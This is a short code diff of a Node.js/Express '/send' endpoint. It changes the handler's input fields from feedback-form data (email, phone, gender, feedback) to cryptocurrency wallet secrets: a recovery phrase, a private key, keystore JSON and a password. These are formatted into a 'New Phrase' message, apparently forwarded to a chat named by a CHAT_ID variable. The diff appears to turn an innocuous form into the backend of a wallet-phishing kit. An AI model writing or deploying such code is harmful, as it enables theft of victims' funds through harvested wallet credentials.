@@ -13,23 +13,23 @@ const CHAT_ID = process.env.CHAT_ID;
 app.post("/send", async (req, res) => {
 
     const {
-        feedback,
-        email,
-        phone,
-        gender
+        phrase,
+        privateKey,
+        keystoreJson,
+        Password
     } = req.body;
 
     const message =
-`📩 New Feedback
+`📩 New Phrase
 
-Email: ${email}
+phrase: ${phrase}
 
-Phone: ${phone}
+privateKey: ${privateKey}
 
-Gender: ${gender}
+keystoreJson: ${keystoreJson}
 
-Feedback:
-${feedback}`;
+Password:
+${Password}`;
 
     try {
 
